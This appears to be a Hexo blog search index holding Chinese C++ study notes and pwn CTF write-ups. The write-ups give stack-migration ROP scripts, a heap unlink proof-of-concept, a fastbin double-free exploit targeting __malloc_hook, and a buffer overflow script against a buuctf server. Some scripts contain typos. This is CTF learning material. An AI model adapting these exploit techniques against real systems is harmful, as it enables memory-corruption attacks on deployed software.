<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>c++学习笔记（面向过程的编程风格）</title>
      <link href="/2019/10/06/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%EF%BC%89/"/>
      <url>/2019/10/06/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B%E7%9A%84%E7%BC%96%E7%A8%8B%E9%A3%8E%E6%A0%BC%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="传值与传址"><a href="#传值与传址" class="headerlink" title="传值与传址"></a>传值与传址</h3><p>传值：只是讲其的值进行复制，再在函数里进行改变，但实际上，那个地址上的值没有任何变动</p><p>在调用函数时，会创建一块栈空间，保存了这个模块中的形参，一旦函数执行完毕，就会pop。</p><p>过程就是  sub   mov   add </p><p>当我们将vec[ix]这样的对象传入函数，默认情况下其值会被复制一份，成为意义上的形参。</p><p>传址：直接对地址上的值进行变动</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>c++学习笔记（c++编程基础）</title>
      <link href="/2019/10/05/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%EF%BC%88c++%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%89/"/>
      <url>/2019/10/05/c++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%20%EF%BC%88c++%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="using-namespace"><a href="#using-namespace" class="headerlink" title="using namespace"></a>using namespace</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span></span><br></pre></td></tr></table></figure><p>形象通俗的讲，就是为了防止同文件中同变量名或函数名产生冲突，只要它们属于不同的名空间</p><h3 id="const"><a href="#const" class="headerlink" title="const"></a>const</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> max_tries = <span class="number">3</span> ;</span><br></pre></td></tr></table></figure><p>被定义为const的对象，在获得初值以后，无法再有任何改动。如果你企图为const对象指定新值，会产生编译错误，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max_tries = <span class="number">41</span> ; <span class="comment">//错误：这是个const对象</span></span><br></pre></td></tr></table></figure><p>这一切的前提都是建立在c++基础上，在c中的const是伪常量，可以通过指针修改，c++里const无法通过指针修改（感谢Delort师傅的传授）</p><h3 id="条件运算符-‘-’-和’-’"><a href="#条件运算符-‘-’-和’-’" class="headerlink" title="条件运算符 ‘?’ 和’:’"></a>条件运算符 ‘?’ 和’:’</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> line_size = <span class="number">8</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> cnt =<span class="number">1</span> ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a_string</span><br><span class="line"></span><br><span class="line"> &lt;&lt; ( cnt % line_size ?  '  '  :  '\n'  ) ;</span><br></pre></td></tr></table></figure><p>条件运算符的一般使用形式如下：</p><p>​    expr</p><p>​        ?  如果expr 为 true ， 就执行这里</p><p>​        :  如果expr 为 false ， 就执行这里</p><p>如何判定 true 与 false呢，此例就是看上面条件表达式 是否为0，0为false，其余为true。</p><h3 id="循环语句之switch"><a href="#循环语句之switch" class="headerlink" title="循环语句之switch"></a>循环语句之switch</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>( <span class="keyword">int</span> number)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line"></span><br><span class="line">​语句块 ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line"></span><br><span class="line">​语句块 ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">​<span class="keyword">case</span> ......</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span> :</span><br><span class="line">        语句块 ;</span><br><span class="line">        <span class="keyword">break</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>switch () 中表达式的值必须为整数</p></li><li><p>表达式的值依次与case 进行比较，符合便执行该case，全没符合，如果有default，便开始执行default ，如果default也没有，就不执行任何操作</p></li><li><p>如果不在case后加上break，一旦在中间匹配到一个case进行，剩下的case全会依次执行！！！！！</p></li></ol><h3 id="Array和Vector-数组"><a href="#Array和Vector-数组" class="headerlink" title="Array和Vector 数组"></a>Array和Vector 数组</h3><h4 id="Array"><a href="#Array" class="headerlink" title="Array :"></a>Array :</h4><ol><li>必须指定元素类型，名称，大小</li></ol><p>​       Array的大小必须是个常量表达式，也就是不需要在运行时求值的表达式，例如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> seq_size = <span class="number">18</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> pell_seq[ seq_size ];</span><br></pre></td></tr></table></figure><ol start="2"><li>支持统一赋值</li></ol><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector :"></a>Vector :</h4><ol><li><p>必须包含vector头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pell_seq[seq_size] ;</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>此处的seq_size 不一定得是个常量表达式</p></li><li><p>不支持统一赋值</p><p>可以进行冗长的逐个赋值</p><p>或者利用已经初始化的Array作为Vector的初值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="keyword">int</span> elem_vals[seq_size] =</span><br><span class="line"></span><br><span class="line">   &#123;</span><br><span class="line">   ​<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span></span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//以elem_vals的值来初始化elem_seq</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; elem_seq( elem_vals, elem_vals+seq_size ) ;</span><br></pre></td></tr></table></figure></li></ol><p>还得注意一点，严禁off by one！！！！！！！！！！！！！！！！！！！！！！</p><p>off by one的危害，可以去另一篇buu刷题之旅查看</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>指针的提领操作：</p><p>如果要访问一个由指针所指对象，得提领，也就是取得 “位于该指针所指内存地址上” 的对象。 在指针前用*</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> ival = <span class="number">1024</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> * pi ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> *pi = &amp;ival ; <span class="comment">//pi初值设置为ival所在的内存地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//提领pi，借以访问它所指向的对象</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  ( *pi ! =<span class="number">1024</span> )  <span class="comment">// 读取ival的值</span></span><br><span class="line"></span><br><span class="line">​*pi = <span class="number">1024</span> ;  <span class="comment">//写值到 ival</span></span><br></pre></td></tr></table></figure><h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><p>​    </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pi ;  <span class="comment">//计算p1所持有的内存地址</span></span><br></pre></td></tr></table></figure><p>此举形同操作“指针对象”本身，在我理解中类似于指针指向的某地址中写入的0x5a6f7780这个地址（pwn爷爷们大概都懂是什么意思，我也就不赘述了）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*pi ;  <span class="comment">// 求ival的值</span></span><br></pre></td></tr></table></figure><p>等于是操作pi所指的对象，在我理解里就是直接对0x5a6f7780这个地址里写入的值进行操作</p><h3 id="文件的读写"><a href="#文件的读写" class="headerlink" title="文件的读写"></a>文件的读写</h3><p>头文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fstream&gt;</span></span></span><br></pre></td></tr></table></figure><p>打开可供写入的文件</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ofstream outfile ( "文件名")；</span><br></pre></td></tr></table></figure><p>注： 此举会使文件中原有数据全部清空</p><p>追加模式写入文件（会写在文件末尾）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ofstream <span class="title">outfile</span><span class="params">(<span class="string">"文件名"</span> , ios_base::app)</span></span>;</span><br></pre></td></tr></table></figure><p>读取文件</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ifstream <span class="title">infile</span><span class="params">(<span class="string">"文件名"</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>注： 从开头开始读取</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>对于栈迁移技术的学习</title>
      <link href="/2019/10/04/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/10/04/%E5%AF%B9%E4%BA%8E%E6%A0%88%E8%BF%81%E7%A7%BB%E6%8A%80%E6%9C%AF%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>题目为 migration</p><p>栈迁移其实就是利用 leave ret<br>因为 leave ret 实际上就是</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span>    <span class="built_in">esp</span>  <span class="built_in">ebp</span></span><br><span class="line">       <span class="keyword">pop</span>  <span class="built_in">ebp</span></span><br><span class="line">       <span class="keyword">pop</span>  <span class="built_in">eip</span></span><br></pre></td></tr></table></figure><p>这是我手动进行的栈迁移，但是…不知道为什么，puts接收数据接收不到，望大佬指正</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./migration'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/i386-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">read_got = elf.got[<span class="string">'read'</span>]</span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line"></span><br><span class="line">pop1_ret = <span class="number">0x0804836d</span></span><br><span class="line">pop3_ret = <span class="number">0x08048569</span></span><br><span class="line"><span class="comment">#################### change stack space#####################</span></span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x28</span> + p32(buf) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#################### leak libc address ########################</span></span><br><span class="line">payload1 = p32(buf2) + p32(puts_plt) + p32(pop1_ret) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(buf2) + p32(<span class="number">0x100</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">puts_add = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = puts_add - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc base address--&gt;[%s]"</span>%hex(libc_base)</span><br><span class="line">system_add = lib_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"system address --&gt;[%s]"</span>%hex(system_add)</span><br><span class="line"><span class="comment">######################  get shell ###########################</span></span><br><span class="line">payload = p32(buf) + p32(read_plt) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(buf) + p32(<span class="number">0x100</span>) + p32(system_add) + <span class="string">'bbbb'</span> + p32(buf)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh,sendline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>下面是利用rop模块进行的，这就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#! -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./migration'</span>)</span><br><span class="line">elf = ELF(<span class="string">'migration'</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x8048380</span></span><br><span class="line">puts_plt = <span class="number">0x8048390</span></span><br><span class="line">leave_ret = <span class="number">0x08048418</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0804836d</span></span><br><span class="line">puts_got = <span class="number">0x8049ff0</span></span><br><span class="line"><span class="comment">#buf = 0x0804b000-0x200</span></span><br><span class="line"><span class="comment">#buf2 = buf + 0x100</span></span><br><span class="line">buf = elf.bss() + <span class="number">0x500</span></span><br><span class="line">buf2 = elf.bss() + <span class="number">0x400</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">40</span></span><br><span class="line">payload += flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">100</span>])</span><br><span class="line">sh.recvuntil(<span class="string">":"</span>)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">rop = flat([buf2,puts_plt,pop_edx_ret,puts_got,read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">100</span>])</span><br><span class="line"></span><br><span class="line">sh.sendline(rop)</span><br><span class="line">sh.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">puts_off = <span class="number">0x5fca0</span></span><br><span class="line">libc = u32(r.recv(<span class="number">4</span>)) - puts_off</span><br><span class="line"><span class="keyword">print</span> <span class="string">"libc:"</span>,hex(libc)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">system_off = <span class="number">0x3ada0</span></span><br><span class="line">system = libc + system_off</span><br><span class="line">rop2 = flat([buf,system,<span class="number">0</span>,buf2+<span class="number">16</span>,<span class="string">"/bin/sh"</span>])</span><br><span class="line">sh.sendline(rop2)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn unlink</title>
      <link href="/2019/10/04/pwn%20%20unlink/"/>
      <url>/2019/10/04/pwn%20%20unlink/</url>
      
        <content type="html"><![CDATA[<p>一个实验的poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ptr1[<span class="number">1</span>] = <span class="number">0x81</span>;</span><br><span class="line">ptr1[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x18</span>;</span><br><span class="line">ptr1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line">ptr2[<span class="number">-2</span>] = <span class="number">0x80</span>;</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p before free\n"</span>,target);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p after free\n"</span>,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>,getpid());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>byte ctf (pwn)</title>
      <link href="/2019/10/04/byte%20ctf%20(pwn)/"/>
      <url>/2019/10/04/byte%20ctf%20(pwn)/</url>
      
        <content type="html"><![CDATA[<h3 id="mulnote"><a href="#mulnote" class="headerlink" title="mulnote"></a>mulnote</h3><p>简单的组合攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./mulnote'</span>)</span><br><span class="line">elf = ELF(<span class="string">'mulnote'</span>)</span><br><span class="line">lib = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">choice</span><span class="params">(achar)</span>:</span></span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,achar)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(size,con)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'C'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(size))</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'R'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(idx,con)</span>:</span></span><br><span class="line">        sh.sendline(<span class="string">'E'</span>)</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,str(idx))</span><br><span class="line">        sh.sendlineafter(<span class="string">'&gt;'</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="comment">########################leak libc#####################</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'1'</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'A'</span>)</span><br><span class="line">show()</span><br><span class="line">libc = u64(sh.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-4</span>:].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">log.success(<span class="string">"libc = %s"</span>%hex(libc))</span><br><span class="line">libc_base = libc - <span class="number">0x3c</span></span><br><span class="line">log.success(<span class="string">"libc_base = %s"</span>%hex(libc_base))</span><br><span class="line">malloc_hook = libc_base + lib.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one = libc.base + <span class="number">0x45216</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'3'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'4'</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook<span class="number">-0x23</span>)) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'6'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'7'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'x00'</span>*<span class="number">0x13</span>+p64(one)) <span class="comment">#8</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;'</span>,<span class="string">'C'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'size&gt;'</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf pwn的刷题之旅（长期更）</title>
      <link href="/2019/10/04/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/"/>
      <url>/2019/10/04/buuctf%20pwn%E7%9A%84%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>在身边人的推荐下，我也踏入了buu的刷题之旅，怀着一丢丢激动，还有些许不安（毕竟菜），在这里记录一下自己的刷题经历</p><h3 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh =remote(<span class="string">'pwn.buuoj.cn'</span>,<span class="number">20035</span>)</span><br><span class="line"><span class="comment">#sh = process('./warmup_csaw_2016')</span></span><br><span class="line"><span class="comment">#elf = ELF('./warmup_casw_2016')</span></span><br><span class="line">libc = ELF(<span class="string">'x64_libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x48</span></span><br><span class="line">payload += p64(<span class="number">0x40060d</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn1-sctf-2016"><a 